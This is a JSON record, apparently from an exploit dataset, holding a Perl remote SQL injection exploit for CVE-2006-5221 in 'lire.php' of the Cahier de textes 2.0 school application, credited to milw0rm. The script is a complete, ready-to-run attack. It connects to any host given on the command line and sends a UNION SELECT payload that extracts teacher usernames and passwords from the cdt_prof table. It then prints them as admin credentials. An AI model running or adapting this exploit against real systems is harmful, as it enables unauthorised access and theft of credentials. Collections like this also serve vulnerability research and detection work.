{
  "id": "2485",
  "title": "Cahier de texte 2.0 - &#039;lire.php&#039; SQL Injection",
  "cve": "CVE-2006-5221",
  "vuln_type": "sqli",
  "code": "# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n#             Cahier  de  textes  \r\n#   Pierre Lemaitre - St L\u00f4 (France) - Ver 2.0\r\n#           \r\n#          Remote SQL injection Exploit\r\n#\r\n#              Discovred By s4mi\r\n#           s4mi[at]linuxmail[dot]org\r\n# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n# exploit Coded by simo64\r\n#\r\n# all thanks to simo64,drackanz,hardose,r00t \r\n#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n#\r\n#\r\n#!/usr/bin/perl\r\n\r\nuse IO::Socket ;\r\n\r\n&header();\r\n\r\n&usage unless(defined($ARGV[0] && $ARGV[1]));\r\n\r\n$host = $ARGV[0];\r\n$path = $ARGV[1];\r\n\r\nsyswrite STDOUT ,\"\\nConnecting ...\";\r\n\r\nmy $sock = new IO::Socket::INET ( PeerAddr => \"$host\",PeerPort => \"80\",Proto => \"tcp\",);\r\n\t\t\t\t\t\t\t\t\r\ndie \"\\nUnable to connect to $host\\n\" unless($sock);\r\n\r\nsyswrite STDOUT, \"[OK]\";\r\n\r\n$inject = \"1&matiere_ID=-1+union%20select%20null,CONCAT(nom_prof,CHAR(58),CHAR(58),passe)%20FROM%20cdt_prof/*\";\t\r\n\r\nsyswrite STDOUT ,\"\\nSending Data ...\";\r\n\r\nprint $sock \"GET $path/lire.php?classe_ID=1&matiere_ID=$inject HTTP/1.1\\n\";\r\nprint $sock \"Host: $host\\n\";\r\nprint $sock \"Referer: $host\\n\";\r\nprint $sock \"Accept-Language: en-us\\n\";\r\nprint $sock \"Content-Type: application/x-www-form-urlencoded\\n\";\r\nprint $sock \"User-Agent: Mozilla/5.0 (BeOS; U; BeOS X.6; en-US; rv:1.7.8) Gecko/20050511 Firefox/1.0.4\\n\";\r\nprint $sock \"Cache-Control: no-cache\\n\";\r\nprint $sock \"Connection: Close\\n\\n\";\r\n\r\nsyswrite STDOUT ,\"[OK]\\n\\n\";\r\n\r\n\twhile($res = <$sock>){\r\n\t#print $res;sleep(1);\r\n\t\tif($res =~ /class=\"Style6\">(.*?)::(.*?)<\\/td>/){\r\n\t\t\tprint \"Exploit Succeded !\\n\\n\";sleep(1);\r\n\t\t\t$userlogin = $1 ;\r\n\t\t\t$userpass  = $2;\r\n\t\t\tprint \"adminlogin  : $userlogin\\n\";sleep(1);\r\n\t\t\tprint \"adminpasswd : $userpass\\n\";sleep(1);\r\n\t\t\t$succeded = \"ok\";\r\n\t\t\t}\r\n\t\t}\r\nif(!defined($succeded)) {print \"\\nExploit Failed\\n\";} else {print \"\\nEnjoy ;)\";}\r\n\r\nsub usage{\r\n\tprint \"\\nUsage   : perl $0 host /path/ \";\r\n\tprint \"\\nExemple : perl $0 www.victime.net /cahier/\\n\";\r\n\texit(0);\r\n}\r\nsub header(){\r\nprint q(\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n            Cahier  de  textes  v2.0 \r\n   Pierre Lemaitre - St L\u00f4 (France) - Ver 2.0\r\n\r\n       Remote SQL injection Exploit by s4mi\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n);\r\n}\r\n\r\n# milw0rm.com [2006-10-07]",
  "url": "https://www.exploit-db.com/exploits/2485"
}